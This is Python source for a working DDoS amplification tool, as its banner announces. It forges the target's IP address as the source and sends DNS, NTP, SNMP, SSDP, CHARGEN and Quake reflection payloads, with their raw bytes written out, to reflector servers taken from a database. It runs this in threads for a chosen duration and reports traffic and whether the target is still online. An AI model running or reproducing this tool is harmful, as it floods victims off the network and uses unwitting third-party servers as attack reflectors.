#!/usr/bin/python
#Copyright D0n aka 13loodH4t @2016

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from optparse import OptionParser
from multiprocessing.dummy import Pool as ThreadPool 
from threading import Thread
from scapy.all import *
from psutil import net_io_counters
from random import randint
from module import mysql, color
import sys, os, socket, signal, time

this = sys.modules[__name__]

def __attack(threads):
	if this.quiet == 0:
		espeakTargetSplitDot = this.target.split('.')
		espeakTargetSplit1 = espeakTargetSplitDot[0]
		espeakTargetSplit2 = espeakTargetSplitDot[1]
		espeakTargetSplit3 = espeakTargetSplitDot[2]
		espeakTargetSplit4 = espeakTargetSplitDot[3]
		espeakTarget1 = ""
		espeakTarget2 = ""
		espeakTarget3 = ""
		espeakTarget4 = ""
		for n in espeakTargetSplit1:
			espeakTarget1 += n+" "
		for n in espeakTargetSplit2:
			espeakTarget2 += n+" "
		for n in espeakTargetSplit3:
			espeakTarget3 += n+" "
		for n in espeakTargetSplit4:
			espeakTarget4 += n+" "
		this.espeakTarget = espeakTarget1+"dot "+espeakTarget2+"dot "+espeakTarget3+"dot "+espeakTarget4
		Thread(target = __speak, args=(200,"f3",160,"I started ddos amplification attack on "+ this.espeakTarget,)).start()
	ampList = mysql.executeSQL("SELECT * FROM amp WHERE dns_quality >"+str(this.quality)+" OR ntp_quality >"+str(this.quality)+" OR snmp_quality >"+str(this.quality)+" OR ssdp_quality >"+str(this.quality)+" OR chargen_quality >"+str(this.quality)+" OR quake_quality >"+str(this.quality)+" ORDER BY RAND();","all")
	for svr in ampList:
		if int(svr[2]) == 1:
			this.ampFactor += int(svr[3])
		if int(svr[5]) == 1:
			this.ampFactor += int(svr[6])
		if int(svr[8]) == 1:
			this.ampFactor += int(svr[9])
		if int(svr[10]) == 1:
			this.ampFactor += int(svr[11])
		if int(svr[12]) == 1:
			this.ampFactor += int(svr[13])
		if int(svr[14]) == 1:
			this.ampFactor += int(svr[15])
	this.ampFactor = this.ampFactor / len(ampList)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect(('10.255.255.255', 0))
			con = s.getsockname()[0]
			s.close()
		except:
			this.monitor = False
			print "\n[!] please check your network connection"
			__speak(200,"f3",160,"please check your network connection")
			os.system('pkill python')
			sys.exit(0)
		ampList = mysql.executeSQL("SELECT * FROM amp WHERE dns_quality >"+str(this.quality)+" OR ntp_quality >"+str(this.quality)+" OR snmp_quality >"+str(this.quality)+" OR ssdp_quality >"+str(this.quality)+" OR chargen_quality >"+str(this.quality)+" OR quake_quality >"+str(this.quality)+" ORDER BY RAND();","all")
		if this.working == 0:
			Thread(target = __monitor).start()
		pool = ThreadPool(int(threads))
		try:
			pool.map_async(__threading, ampList).get(9999999)
		except KeyboardInterrupt:
			this.monitor = False
			print "\n\n[!] killing all python processes"
			__speak(200,"f3",160,"I killed all python processes")
			os.system('pkill python')
			sys.exit(0)
		pool.close()
		pool.join()

def __threading(svr):
	try:
		if this.stopTime < time.time() and this.cur % 128 == 0:
			this.once += 1
			if this.once == 1:
				this.monitor = False
				__speak(200,"f3",160,"I finished ddos amplification attack on "+ this.espeakTarget)
				print "\n\n[!] killing all python processes"
				__speak(200,"f3",160,"I killed all python processes")
				os.system('pkill python')
				sys.exit(0)
		this.cur += 1
		ip = str(svr[1])
		port = randint(14000,64000)
		if int(svr[2]) == 1:
			""" DNS """
			domain = str(svr[4])
			send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=53)/DNS(rd=1,qd=DNSQR(qname=domain,qtype='ALL')), count=2, verbose=0)
		if int(svr[5]) == 1:
			""" NTP """
			data = str(svr[7])	
			if data == "4":
				send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=123)/Raw(load=this.payload['ntp4']), count=2, verbose=0)
			elif data == "61":
				send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=123)/Raw(load=this.payload['ntp61']), count=2, verbose=0)
		if int(svr[8]) == 1:
			""" SNMP """
			send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=161)/Raw(load=this.payload['snmp']), count=2, verbose=0)
		if int(svr[10]) == 1:
			""" SSDP """
			send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=1900)/Raw(load=this.payload['ssdp']), count=2, verbose=0)
		if int(svr[12]) == 1:
			""" CHARGEN """
			send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=19)/Raw(load=this.payload['chargen']), count=2, verbose=0)
		if int(svr[14]) == 1:
			""" QUAKE """
			send(IP(src=this.target,dst=ip)/UDP(sport=port,dport=27960)/Raw(load=this.payload['quake']), count=2, verbose=0)
	except Exception, e:
		print str(e)

def __sniff(srcPort):
	try:
		this.packets[srcPort] = sniff(filter="udp and port "+str(srcPort), timeout=2)
	except Exception, e:
		print "[!] "+ str(e)
		
def __monitor():	
	this.working = 1	
	while this.monitor == True:
		this.countM += 2
		if this.countM % 600 == 0:
			try:
				if str(this.targetName) == "localhost":
					s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
					s.connect(('10.255.255.255', 0))
					target = s.getsockname()[0]
					this.target = str(target)
					s.close()
					this.targetName = "localhost"
				else:
					try:
						aton = socket.inet_aton(str(options.target))
						this.target = str(options.target)
						this.targetName = "Unknown"
					except:
						this.target = str(socket.gethostbyname(str(options.target)))
						this.targetName = str(options.target)
				this.targetIP = str(this.target)
				this.status = "online"
			except:
				this.status = "offline"
				_
		sendBytes = 0
		ifaces = net_io_counters(pernic=True)
		startBytes = int(ifaces["wlan0"].bytes_sent)
		time.sleep(2)
		ifaces = net_io_counters(pernic=True)
		endBytes = int(ifaces["wlan0"].bytes_sent)
		sendBytes = endBytes - startBytes
		sendBytes = (float(sendBytes)/float(2))
		this.sendBytes = int(sendBytes)
		rcvBits = sendBytes*(this.q+1)
		if sendBytes > 1000000000:
			"""GByts"""
			sendBytes = sendBytes/float(1000000000)
			sendBytes = format(sendBytes, '.0f')
			sendStr = str(sendBytes)+" GBps"
		elif sendBytes > 1000000:
			"""MByts"""
			sendBytes = sendBytes/float(1000000)
			sendBytes = format(sendBytes, '.0f')
			sendStr = str(sendBytes)+" MBps"
		elif sendBytes > 1000:
			"""KByts"""
			sendBytes = sendBytes/float(1000)
			sendBytes = format(sendBytes, '.0f')
			sendStr = str(sendBytes)+" KBps"
		else:
			"""Byts"""
			sendBytes = format(sendBytes, '.0f')
			sendStr = str(sendBytes)+" Bps"
		if rcvBits > 1000000000:
			"""GBits"""
			rcvBits = rcvBits/float(1000000000)
			rcvBits = format(rcvBits, '.0f')
			rcvStr = str(rcvBits)+" Gbps"
		elif rcvBits > 1000000:
			"""MBits"""
			rcvBits = rcvBits/float(1000000)
			rcvBits = format(rcvBits, '.0f')
			rcvStr = str(rcvBits)+" Mbps"
		elif rcvBits > 1000:
			"""KBits"""
			rcvBits = rcvBits/float(1000)
			rcvBits = format(rcvBits, '.0f')
			rcvStr = str(rcvBits)+" Kbps"
		else:
			"""Bits"""
			rcvBits = format(rcvBits, '.0f')
			rcvStr = str(rcvBits)+" bps"
		CURSOR_UP_ONE = "\x1b[1A" 
		ERASE_LINE = "\x1b[2K"
		print CURSOR_UP_ONE + CURSOR_UP_ONE + CURSOR_UP_ONE + ERASE_LINE +"  |                  |                  |                    |                  |  "               
		sys.stdout.write("  ")
		sys.stdout.write("|")
		l = 18 - len(this.targetName)
		if l < 0:
				__speak(200,"f3",160,"I have a problem to fetch this target")
				print "\n\n[!] killing all python processes"
				os.system('pkill python')
				sys.exit(0)
		if len(this.targetName) % 2 == 0:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.targetName + color.OKCYAN)
			for i in range(0,spaces):
				sys.stdout.write(" ")
		else:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.targetName + color.OKCYAN)
			for i in range(spaces+1):
				sys.stdout.write(" ")
		sys.stdout.write("|")
		l = 18 - len(this.targetIP)
		if l < 0:
				__speak(200,"f3",160,"I have a problem to fetch this target")
				print "\n\n[!] killing all python processes"
				os.system('pkill python')
				sys.exit(0)
		if len(this.targetIP) % 2 == 0:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.targetIP + color.OKCYAN)
			for i in range(0,spaces):
				sys.stdout.write(" ")
		else:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.targetIP + color.OKCYAN)
			for i in range(spaces+1):
				sys.stdout.write(" ")
		sys.stdout.write("|")
		l = 20 - len(sendStr) - len(rcvStr) - 3
		if (len(sendStr)+len(rcvStr)+3) % 2 == 0:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + sendStr + color.OKCYAN +" | "+ color.WARNING + rcvStr + color.OKCYAN)
			for i in range(0,spaces):
				sys.stdout.write(" ")
		else:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + sendStr + color.OKCYAN +" | "+ color.WARNING + rcvStr + color.OKCYAN)
			for i in range(spaces+1):
				sys.stdout.write(" ")
		sys.stdout.write("|")
		l = 18 - len(this.status)
		if len(this.status) % 2 == 0:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.status + color.OKCYAN)
			for i in range(0,spaces):
				sys.stdout.write(" ")
		else:
			spaces = l/2
			for i in range(0,spaces):
				sys.stdout.write(" ")
			sys.stdout.write(color.WARNING + this.status + color.OKCYAN)
			for i in range(spaces+1):
				sys.stdout.write(" ")
		sys.stdout.write("|\n")
		print "  |__________________|__________________|____________________|__________________|  "
		if this.status == "offline" and this.speakOnce == 0:
			this.speakOnce += 1
			Thread(target = __speak, args=(200,"f3",160,"the target is now offline",)).start()
	this.working = 0

def __speak(vol,voice,speed,txt):
	os.system("espeak -a "+str(vol)+" -ven+"+str(voice)+" -s "+str(speed)+" '"+str(txt)+"'")

def main():
	parser = OptionParser()
	usage = 'usage: %prog [options]'

	parser.add_option("--target", type="string", metavar="hostname",
					  help="set target hostname",
					  dest="target")
					  
	parser.add_option("--time", metavar="1m",
					  help="set time for attack [d,h,m,s]",
					  dest="time")
					  
	parser.add_option("--quality", metavar="0-5",
					  help="set quality level",
					  dest="quality")
					  
	parser.add_option("--risk", metavar="1-10",
					  help="set risk level",
					  dest="risk")
					  
	parser.add_option("--threads", metavar="1-128",
					  help="number of threads to use",
					  dest="threads")
					  
	parser.add_option("--quiet", metavar="0-1",
					  help="run without sound effects",
					  dest="quiet")
					  
	(options, args) = parser.parse_args()
	
	if len(sys.argv[1:]) != 0 and options.target:
		print "\x1b[8;21;83t"+ color.FAIL
		os.system("clear")
		print " "
		print "   $$\   $$$$$$\  $$\                           $$\ $$\   $$\ $$\   $$\   $$\      "
		print " $$$$ | $$ ___$$\ $$ |                          $$ |$$ |  $$ |$$ |  $$ |  $$ |     "
		print " \_$$ | \_/   $$ |$$ | $$$$$$\   $$$$$$\   $$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$\    "
		print "   $$ |   $$$$$ / $$ |$$  __$$\ $$  __$$\ $$  __$$ |$$$$$$$$ |$$$$$$$$ |\_$$  _|   "
		print "   $$ |   \___$$\ $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$  __$$ |\_____$$ |  $$ |     "
		print "   $$ | $$\   $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |      $$ |  $$ |$$\  "
		print " $$$$$$\\\$$$$$$  |$$ |\$$$$$$  |\$$$$$$  |\$$$$$$$ |$$ |  $$ |      $$ |  \$$$$  | "
		print " \______|\______/ \__| \______/  \______/  \_______|\__|  \__|      \__|   \____/  "
		print " "+ color.BOLD
		print "                  DDOS Amplification Tool - Version 0.9.1b Beta                  "   
		print " "+ color.ENDC + color.OKCYAN
		print "   _____________________________________________________________________________   "
		print "  |                  |                  |                    |                  |  "
		print "  |      "+color.BOLD+"Target"+color.ENDC + color.OKCYAN+"      |        "+color.BOLD+"IP"+color.ENDC + color.OKCYAN+"        |       "+color.BOLD+"Traffic"+color.ENDC + color.OKCYAN+"      |      "+color.BOLD+"Status"+color.ENDC + color.OKCYAN+"      |  "
		print "  |-----------------------------------------------------------------------------|  "
		print "  |                                                                             |  "
		print "  |                              "+ color.BOLD + color.OKGREEN +"... Loading ..."+ color.ENDC + color.OKCYAN +"                                |  "
		print "  |_____________________________________________________________________________|  "

		
		try:
			if str(options.target) == "localhost":
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				s.connect(('10.255.255.255', 0))
				target = s.getsockname()[0]
				this.target = str(target)
				s.close()
				this.targetName = "localhost"
			else:
				try:
					aton = socket.inet_aton(str(options.target))
					this.target = str(options.target)
					this.targetName = "Unknown"
				except:
					this.target = str(socket.gethostbyname(str(options.target)))
					this.targetName = str(options.target)
			this.targetIP = str(this.target)
		except:
			print "\n[!] target hostname is unreachable\n"
			parser.print_help()
			sys.exit(0)
		try:
			if options.time:
				if "s" in str(options.time):
					options.time = str(options.time).replace("s","")
					this.duration = int(options.time)
				elif "m" in str(options.time):
					options.time = str(options.time).replace("m","")
					this.duration = int(options.time) *60
				elif "h" in str(options.time):
					options.time = str(options.time).replace("h","")
					this.duration = int(options.time) *60*60
				elif "d" in str(options.time):
					options.time = str(options.time).replace("d","")
					this.duration = int(options.time) *60*60*24
				else:
					print "\n[!] time sequence is invalid\n"
					parser.print_help()
					sys.exit(0)	
			else:
				this.duration = 60
		except:
			print "\n[!] time sequence is invalid\n"
			parser.print_help()
			sys.exit(0)
		try:
			if options.quality:
				if int(options.quality) == 0:
					this.quality = 0
					this.q = 0
				elif int(options.quality) == 1:
					this.quality = 5
					this.q = 1
				elif int(options.quality) == 2:
					this.quality = 10
					this.q = 2
				elif int(options.quality) == 3:
					this.quality = 25
					this.q = 3
				elif int(options.quality) == 4:
					this.quality = 50
					this.q = 4
				elif int(options.quality) == 5:
					this.quality = 100
					this.q = 5
				else:
					this.quality = 250
					this.q = 6
			else:
				this.quality = 10
				this.q = 2
		except:
			print "\n[!] quality level is invalid\n"
			parser.print_help()
			sys.exit(0)
		try:
			if options.risk:
				if int(options.risk) != 0:
					this.risk = int(options.risk) **4
				else:
					this.risk = 10
			else:
				this.risk = 1
		except:
			print "\n[!] risk level is invalid\n"
			parser.print_help()
			sys.exit(0)
		try:
			if options.threads:
				threads = int(options.threads)
			else:
				threads = 1
		except:
			print "\n[!] thread nummber is invalid\n"
			parser.print_help()
			sys.exit(0)
		try:
			if options.quiet:
				this.quiet = int(options.quiet)
			else:
				this.quiet = 0
		except:
			print "\n[!] thread nummber is invalid\n"
			parser.print_help()
			sys.exit(0)
		
			
		this.payload = {
			'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
				'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
				'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
				'\x01\x02\x01\x05\x00'),
			'ntp4':('\x17\x00\x02\x2a'+'\x00'*4),
			'ntp61':('\x17\x00\x03\x2a'+'\x00'*61),
			'chargen':('0'),
			'quake':('\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'),
			'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
				'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
		}
		
		if this:
			this.stopTime = time.time() + this.duration
			this.cur = 0
			this.countM = 0
			this.once = 0
			this.working = 0
			this.ampFactor = 0
			this.speakOnce = 0
			this.sendBytes = 0
			this.monitor = True
			this.status = "online"
			this.packets = {}
		
		__attack(threads)
			
	else:
		print "[!] please give me a target\n"
		parser.print_help()
		sys.exit(0)

if __name__== '__main__':
	main()
